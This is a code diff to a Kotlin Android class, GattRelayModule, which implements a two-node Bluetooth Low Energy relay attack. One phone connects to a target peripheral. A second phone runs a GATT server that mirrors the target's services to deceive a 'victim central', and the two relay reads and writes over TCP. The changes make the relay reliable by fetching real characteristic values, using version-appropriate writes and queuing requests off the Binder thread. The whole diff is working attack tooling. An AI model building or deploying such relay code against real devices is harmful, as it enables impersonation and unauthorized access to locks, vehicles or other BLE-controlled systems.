@@ -13,11 +13,18 @@ import android.bluetooth.BluetoothGattService
 import android.bluetooth.BluetoothManager
 import android.bluetooth.BluetoothProfile
 import android.content.Context
+import android.os.Build
 import android.util.Log
+import kotlinx.coroutines.CancellableContinuation
+import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.cancel
+import kotlinx.coroutines.channels.Channel
 import kotlinx.coroutines.flow.Flow
 import kotlinx.coroutines.flow.flow
 import kotlinx.coroutines.flow.flowOn
+import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withContext
 import java.io.DataInputStream
@@ -87,6 +94,90 @@ class GattRelayModule(
         private val CCCD_UUID: UUID = UUID.fromString("00002902-0000-1000-8000-00805f9b34fb")
     }
 
+    /**
+     * Queued GATT server requests from the Binder thread, processed on Dispatchers.IO.
+     */
+    private sealed class GattRequest {
+        data class CharReadRequest(
+            val device: BluetoothDevice,
+            val requestId: Int,
+            val offset: Int,
+            val serviceUuid: UUID,
+            val charUuid: UUID
+        ) : GattRequest()
+
+        data class CharWriteRequest(
+            val device: BluetoothDevice,
+            val requestId: Int,
+            val offset: Int,
+            val responseNeeded: Boolean,
+            val serviceUuid: UUID,
+            val charUuid: UUID,
+            val data: ByteArray
+        ) : GattRequest()
+    }
+
+    /**
+     * Single shared callback for GATT client operations (connection, discovery, reads).
+     * Uses mutable continuation fields so that connectGattClient(), discoverServices(),
+     * and readCharacteristicAsync() all share the same callback instance registered
+     * with connectGatt().
+     */
+    private inner class GattRelayCallback : BluetoothGattCallback() {
+        @Volatile
+        var connectionContinuation: CancellableContinuation<BluetoothGatt?>? = null
+
+        @Volatile
+        var discoveryContinuation: CancellableContinuation<Boolean>? = null
+
+        @Volatile
+        var readContinuation: CancellableContinuation<ByteArray>? = null
+
+        override fun onConnectionStateChange(gatt: BluetoothGatt?, status: Int, newState: Int) {
+            if (newState == BluetoothProfile.STATE_CONNECTED) {
+                connectionContinuation?.resume(gatt)
+                connectionContinuation = null
+            } else if (newState == BluetoothProfile.STATE_DISCONNECTED && status != BluetoothGatt.GATT_SUCCESS) {
+                gatt?.close()
+                connectionContinuation?.resume(null)
+                connectionContinuation = null
+            }
+        }
+
+        override fun onServicesDiscovered(gatt: BluetoothGatt?, status: Int) {
+            discoveryContinuation?.resume(status == BluetoothGatt.GATT_SUCCESS)
+            discoveryContinuation = null
+        }
+
+        @Suppress("DEPRECATION")
+        override fun onCharacteristicRead(
+            gatt: BluetoothGatt,
+            characteristic: BluetoothGattCharacteristic,
+            status: Int
+        ) {
+            // Called on pre-TIRAMISU; data is in characteristic.value
+            val data = if (status == BluetoothGatt.GATT_SUCCESS) {
+                characteristic.value ?: ByteArray(0)
+            } else {
+                ByteArray(0)
+            }
+            readContinuation?.resume(data)
+            readContinuation = null
+        }
+
+        override fun onCharacteristicRead(
+            gatt: BluetoothGatt,
+            characteristic: BluetoothGattCharacteristic,
+            value: ByteArray,
+            status: Int
+        ) {
+            // Called on TIRAMISU+; data is in the value parameter
+            val data = if (status == BluetoothGatt.GATT_SUCCESS) value else ByteArray(0)
+            readContinuation?.resume(data)
+            readContinuation = null
+        }
+    }
+
     private val bluetoothManager: BluetoothManager? by lazy {
         context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
     }
@@ -96,6 +187,7 @@ class GattRelayModule(
     private var gattServer: BluetoothGattServer? = null
     private var tcpServerSocket: ServerSocket? = null
     private var tcpSocket: Socket? = null
+    private var gattRelayCallback: GattRelayCallback? = null
 
     /**
      * Starts the relay operation based on the selected role.
@@ -222,11 +314,8 @@ class GattRelayModule(
                         val service = gattResult.getService(serviceUuid)
                         val characteristic = service?.getCharacteristic(charUuid)
                         if (characteristic != null) {
-                            gattResult.readCharacteristic(characteristic)
-                            // The response is delivered via the GattCallback; we handle it
-                            // asynchronously and send it back when onCharacteristicRead fires.
-                            // For simplicity, we read the cached value:
-                            val value = characteristic.value ?: ByteArray(0)
+                            // Read actual data from the target via the shared callback
+                            val value = readCharacteristicAsync(gattResult, characteristic)
                             dataOut.writeByte(MSG_CHAR_READ_RESPONSE.toInt())
                             dataOut.writeUTF(serviceUuid.toString())
                             dataOut.writeUTF(charUuid.toString())
@@ -246,8 +335,19 @@ class GattRelayModule(
                         val service = gattResult.getService(serviceUuid)
                         val characteristic = service?.getCharacteristic(charUuid)
                         if (characteristic != null) {
-                            characteristic.value = data
-                            gattResult.writeCharacteristic(characteristic)
+                            // Use version-appropriate write API (1E fix)
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                                gattResult.writeCharacteristic(
+                                    characteristic,
+                                    data,
+                                    BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT
+                                )
+                            } else {
+                                @Suppress("DEPRECATION")
+                                characteristic.value = data
+                                @Suppress("DEPRECATION")
+                                gattResult.writeCharacteristic(characteristic)
+                            }
                             dataOut.writeByte(MSG_CHAR_WRITE_RESPONSE.toInt())
                             dataOut.writeUTF(serviceUuid.toString())
                             dataOut.writeUTF(charUuid.toString())
@@ -271,6 +371,9 @@ class GattRelayModule(
      * - Receives service discovery data
      * - Sets up a local GATT server mirroring the target's services
      * - Proxies GATT operations from the victim central through TCP to Node A
+     *
+     * GATT server callbacks queue requests into a Channel so that TCP I/O runs on
+     * Dispatchers.IO instead of the Binder thread.
      */
     private fun runNodeB(targetAddress: String): Flow<String> = flow {
         val manager = bluetoothManager ?: run {
@@ -298,7 +401,12 @@ class GattRelayModule(
         val mirroredServices = receiveServiceDiscoveryFromNodeA(dataIn)
         emit("Received ${mirroredServices.size} services to mirror.")
 
-        // Set up a local GATT server mirroring the target's services
+        // Channel for queuing GATT requests off the Binder thread
+        val gattRequestChannel = Channel<GattRequest>(Channel.UNLIMITED)
+
+        // Set up a local GATT server mirroring the target's services.
+        // Callbacks enqueue requests into the channel and return immediately,
+        // avoiding blocking TCP I/O on the Binder thread.
         emit("Setting up mirrored GATT server...")
         val serverCallback = object : BluetoothGattServerCallback() {
             override fun onConnectionStateChange(device: BluetoothDevice?, status: Int, newState: Int) {
@@ -318,29 +426,15 @@ class GattRelayModule(
             ) {
                 if (device == null || characteristic == null) return
                 val service = characteristic.service ?: return
-                try {
-                    // Forward read request to Node A
-                    dataOut.writeByte(MSG_CHAR_READ_REQUEST.toInt())
-                    dataOut.writeUTF(service.uuid.toString())
-                    dataOut.writeUTF(characteristic.uuid.toString())
-                    dataOut.flush()
-
-                    // Read response from Node A
-                    val responseType = dataIn.readByte()
-                    if (responseType == MSG_CHAR_READ_RESPONSE) {
-                        dataIn.readUTF() // service UUID (discard, we know it)
-                        dataIn.readUTF() // char UUID (discard, we know it)
-                        val dataLen = dataIn.readInt()
-                        val data = ByteArray(dataLen)
-                        dataIn.readFully(data)
-                        gattServer?.sendResponse(device, requestId, BluetoothGatt.GATT_SUCCESS, offset, data)
-                    } else {
-                        gattServer?.sendResponse(device, requestId, BluetoothGatt.GATT_FAILURE, offset, null)
-                    }
-                } catch (e: IOException) {
-                    Log.e(TAG, "Error forwarding read request", e)
-                    gattServer?.sendResponse(device, requestId, BluetoothGatt.GATT_FAILURE, offset, null)
-                }
+                gattRequestChannel.trySend(
+                    GattRequest.CharReadRequest(
+                        device = device,
+                        requestId = requestId,
+                        offset = offset,
+                        serviceUuid = service.uuid,
+                        charUuid = characteristic.uuid
+                    )
+                )
             }
 
             override fun onCharacteristicWriteRequest(
@@ -351,34 +445,17 @@ class GattRelayModule(
             ) {
                 if (device == null || characteristic == null) return
                 val service = characteristic.service ?: return
-                val writeData = value ?: ByteArray(0)
-                try {
-                    // Forward write request to Node A
-                    dataOut.writeByte(MSG_CHAR_WRITE_REQUEST.toInt())
-                    dataOut.writeUTF(service.uuid.toString())
-                    dataOut.writeUTF(characteristic.uuid.toString())
-                    dataOut.writeInt(writeData.size)
-                    dataOut.write(writeData)
-                    dataOut.flush()
-
-                    if (responseNeeded) {
-                        // Read response from Node A
-                        val responseType = dataIn.readByte()
-                        if (responseType == MSG_CHAR_WRITE_RESPONSE) {
-                            dataIn.readUTF() // service UUID
-                            dataIn.readUTF() // char UUID
-                            val status = dataIn.readByte().toInt()
-                            gattServer?.sendResponse(device, requestId, status, offset, null)
-                        } else {
-                            gattServer?.sendResponse(device, requestId, BluetoothGatt.GATT_FAILURE, offset, null)
-                        }
-                    }
-                } catch (e: IOException) {
-                    Log.e(TAG, "Error forwarding write request", e)
-                    if (responseNeeded) {
-                        gattServer?.sendResponse(device, requestId, BluetoothGatt.GATT_FAILURE, offset, null)
-                    }
-                }
+                gattRequestChannel.trySend(
+                    GattRequest.CharWriteRequest(
+                        device = device,
+                        requestId = requestId,
+                        offset = offset,
+                        responseNeeded = responseNeeded,
+                        serviceUuid = service.uuid,
+                        charUuid = characteristic.uuid,
+                        data = value ?: ByteArray(0)
+                    )
+                )
             }
 
             override fun onDescriptorReadRequest(
@@ -419,6 +496,89 @@ class GattRelayModule(
         }
         emit("GATT server ready with ${mirroredServices.size} mirrored services. Waiting for victim central...")
 
+        // Launch a dedicated coroutine to process queued GATT requests on Dispatchers.IO.
+        // This keeps TCP I/O off the Binder thread.
+        val processingScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+        processingScope.launch {
+            for (request in gattRequestChannel) {
+                try {
+                    when (request) {
+                        is GattRequest.CharReadRequest -> {
+                            // Forward read request to Node A over TCP
+                            dataOut.writeByte(MSG_CHAR_READ_REQUEST.toInt())
+                            dataOut.writeUTF(request.serviceUuid.toString())
+                            dataOut.writeUTF(request.charUuid.toString())
+                            dataOut.flush()
+
+                            // Read response from Node A
+                            val responseType = dataIn.readByte()
+                            if (responseType == MSG_CHAR_READ_RESPONSE) {
+                                dataIn.readUTF() // service UUID (discard)
+                                dataIn.readUTF() // char UUID (discard)
+                                val dataLen = dataIn.readInt()
+                                val data = ByteArray(dataLen)
+                                dataIn.readFully(data)
+                                gattServer?.sendResponse(
+                                    request.device, request.requestId,
+                                    BluetoothGatt.GATT_SUCCESS, request.offset, data
+                                )
+                            } else {
+                                gattServer?.sendResponse(
+                                    request.device, request.requestId,
+                                    BluetoothGatt.GATT_FAILURE, request.offset, null
+                                )
+                            }
+                        }
+                        is GattRequest.CharWriteRequest -> {
+                            // Forward write request to Node A over TCP
+                            dataOut.writeByte(MSG_CHAR_WRITE_REQUEST.toInt())
+                            dataOut.writeUTF(request.serviceUuid.toString())
+                            dataOut.writeUTF(request.charUuid.toString())
+                            dataOut.writeInt(request.data.size)
+                            dataOut.write(request.data)
+                            dataOut.flush()
+
+                            if (request.responseNeeded) {
+                                val responseType = dataIn.readByte()
+                                if (responseType == MSG_CHAR_WRITE_RESPONSE) {
+                                    dataIn.readUTF() // service UUID
+                                    dataIn.readUTF() // char UUID
+                                    val status = dataIn.readByte().toInt()
+                                    gattServer?.sendResponse(
+                                        request.device, request.requestId,
+                                        status, request.offset, null
+                                    )
+                                } else {
+                                    gattServer?.sendResponse(
+                                        request.device, request.requestId,
+                                        BluetoothGatt.GATT_FAILURE, request.offset, null
+                                    )
+                                }
+                            }
+                        }
+                    }
+                } catch (e: IOException) {
+                    Log.e(TAG, "Error processing GATT request", e)
+                    when (request) {
+                        is GattRequest.CharReadRequest -> {
+                            gattServer?.sendResponse(
+                                request.device, request.requestId,
+                                BluetoothGatt.GATT_FAILURE, request.offset, null
+                            )
+                        }
+                        is GattRequest.CharWriteRequest -> {
+                            if (request.responseNeeded) {
+                                gattServer?.sendResponse(
+                                    request.device, request.requestId,
+                                    BluetoothGatt.GATT_FAILURE, request.offset, null
+                                )
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
         // Keep alive until the TCP connection drops
         try {
             while (!socket.isClosed) {
@@ -454,9 +614,26 @@ class GattRelayModule(
             emit("Node B relay loop ended: ${e.message}")
         } finally {
             emit("Cleaning up Node B resources...")
+            processingScope.cancel()
+            gattRequestChannel.close()
             cleanup()
         }
     }.flowOn(Dispatchers.IO)
+
+    /**
+     * Reads a characteristic from the target peripheral asynchronously,
+     * suspending until the onCharacteristicRead callback fires with actual data.
+     */
+    private suspend fun readCharacteristicAsync(
+        gatt: BluetoothGatt,
+        characteristic: BluetoothGattCharacteristic
+    ): ByteArray {
+        val callback = gattRelayCallback ?: return ByteArray(0)
+        return suspendCancellableCoroutine { cont ->
+            callback.readContinuation = cont
+            gatt.readCharacteristic(characteristic)
+        }
+    }
 
     /**
      * Serializes discovered GATT services over the TCP backchannel to Node B.
@@ -554,37 +731,28 @@ class GattRelayModule(
 
     /**
      * Connects to a remote BLE device as a GATT client and suspends until the
-     * connection callback fires.
+     * connection callback fires. Uses the shared [GattRelayCallback] so that
+     * subsequent service discovery and characteristic reads use the same callback
+     * registered with connectGatt().
      */
     private suspend fun connectGattClient(device: BluetoothDevice): BluetoothGatt? {
+        val callback = GattRelayCallback()
+        gattRelayCallback = callback
         return suspendCancellableCoroutine { cont ->
-            val callback = object : BluetoothGattCallback() {
-                override fun onConnectionStateChange(gatt: BluetoothGatt?, status: Int, newState: Int) {
-                    if (newState == BluetoothProfile.STATE_CONNECTED) {
-                        cont.resume(gatt)
-                    } else if (newState == BluetoothProfile.STATE_DISCONNECTED && status != BluetoothGatt.GATT_SUCCESS) {
-                        gatt?.close()
-                        cont.resume(null)
-                    }
-                }
-            }
-            device.connectGatt(context, false, callback)
+            callback.connectionContinuation = cont
+            val gattInstance = device.connectGatt(context, false, callback)
+            cont.invokeOnCancellation { gattInstance?.close() }
         }
     }
 
     /**
-     * Initiates GATT service discovery and suspends until the callback fires.
+     * Initiates GATT service discovery and suspends until the shared callback's
+     * onServicesDiscovered fires.
      */
     private suspend fun discoverServices(gatt: BluetoothGatt): Boolean {
+        val callback = gattRelayCallback ?: return false
         return suspendCancellableCoroutine { cont ->
-            val originalCallback = object : BluetoothGattCallback() {
-                override fun onServicesDiscovered(g: BluetoothGatt?, status: Int) {
-                    cont.resume(status == BluetoothGatt.GATT_SUCCESS)
-                }
-            }
-            // Note: We reuse the existing gatt connection; discoverServices uses
-            // the callback registered during connectGatt. For a production implementation,
-            // the callback should be set up to handle both connection and discovery.
+            callback.discoveryContinuation = cont
             gatt.discoverServices()
         }
     }
@@ -624,5 +792,6 @@ class GattRelayModule(
         } catch (e: Exception) {
             Log.e(TAG, "Error closing TCP server socket", e)
         }
+        gattRelayCallback = null
     }
 }
